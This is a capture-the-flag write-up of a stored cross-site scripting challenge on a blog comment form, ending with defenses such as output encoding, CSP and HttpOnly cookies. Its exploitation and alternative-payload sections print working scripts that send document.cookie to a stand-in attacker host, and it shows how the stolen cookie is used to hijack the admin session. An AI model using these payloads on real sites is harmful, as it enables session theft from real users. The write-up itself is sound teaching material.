# XSS: Stored Cross-Site Scripting

| Field | Value |
|-------|-------|
| **Category** | Web Exploitation |
| **Difficulty** | Medium |
| **Points** | 250 |
| **Flag** | `CTF{st0r3d_xss_c00k13_th13f}` |
| **Tools** | Browser DevTools, Burp Suite |

## Challenge Description

> "Our blog platform lets users leave comments. The admin reviews every comment personally. Can you steal the admin's session?"
>
> Submit a comment at `http://challenge.ctf.local:9090/blog/1`. An admin bot visits the page every 30 seconds. The flag is stored in the admin's cookie.

## Reconnaissance

The blog post has a comment form with name and message fields. I submitted a normal comment and confirmed it persists on the page: this means stored XSS is possible if input is not sanitized.

Inspecting how the comment renders in the page source:

```html
<div class="comment">
  <strong>TestUser</strong>
  <p>This is a normal comment</p>
</div>
```

The comment body is inserted directly into the HTML without encoding.

## Testing for XSS

### Reflected XSS Probe

First, I tested whether basic HTML tags are rendered:

```
Comment: <b>bold test</b>
```

The text appeared **bold** on the page: HTML is not being escaped. I escalated to a script tag:

```
Comment: <script>alert(1)</script>
```

An alert box popped. The application performs zero input sanitization on comment bodies.

### Confirming Stored XSS

After refreshing the page, the alert fired again. The malicious script is stored in the database and executes every time the page loads. This affects every visitor, including the admin bot.

## Exploitation: Cookie Exfiltration

I set up a listener on my attack machine to capture incoming requests:

```bash
python3 -m http.server 4444
```

Then submitted a comment with a cookie-stealing payload:

```html
<script>
  var img = new Image();
  img.src = "http://attacker.ctf.local:4444/steal?c=" + document.cookie;
</script>
```

Within 30 seconds, the admin bot visited the page, and my listener received:

```
GET /steal?c=session=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJmbGFnIjoiQ1RGe3N0MHIzZF94c3NfYzAwa
```

Decoding the JWT-style session cookie revealed the flag: `CTF{st0r3d_xss_c00k13_th13f}`

### Alternative Payloads

If `<script>` tags are filtered but other HTML is allowed, several bypass techniques exist:

```html
<!-- Event handler -->

<!-- SVG -->
<svg onload="fetch('http://attacker:4444/?c='+document.cookie)">

<!-- Body tag injection -->
<body onload="fetch('http://attacker:4444/?c='+document.cookie)">
```

A broader list of payloads is maintained in [scripts/xss_payloads.txt](../scripts/xss_payloads.txt).

### Session Hijacking

With the stolen session cookie, I replaced my own cookie using DevTools:

```javascript
document.cookie = "session=eyJhbGciOiJIUzI1NiJ9...";
```

Refreshing the page loaded the admin dashboard, confirming full session hijacking.

## Underlying Vulnerability

The application inserts user-supplied input directly into the HTML DOM without encoding or sanitization. This allows an attacker to inject arbitrary JavaScript that executes in every visitor's browser context (A03:2021: Injection).

Stored XSS is particularly dangerous because it does not require tricking the victim into clicking a link: simply visiting the page triggers execution.

## Defense and Mitigation

**Output encoding** is the primary defense. All user input rendered in HTML must be entity-encoded:

```python
import html

# Encode before rendering
safe_comment = html.escape(user_comment)
# <script> becomes &lt;script&gt;
```

Additional defenses:

- **Content Security Policy (CSP)**: Restrict where scripts can load from. A strict CSP prevents inline script execution entirely:
  ```
  Content-Security-Policy: default-src 'self'; script-src 'self'
  ```
- **HttpOnly cookies**: Setting the `HttpOnly` flag on session cookies prevents JavaScript from accessing them via `document.cookie`, making cookie theft impossible even if XSS exists.
  ```
  Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
  ```
- **Input validation**: Reject or strip HTML tags from fields where markup is not expected.
- **Templating engines**: Modern frameworks (React, Jinja2, Django templates) auto-escape output by default. Avoid using `dangerouslySetInnerHTML` or `|safe` filters.
- **DOMPurify**: If rich text is required, sanitize with a library like DOMPurify before rendering.

## References

- [OWASP Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- [Content Security Policy Reference](https://content-security-policy.com/)
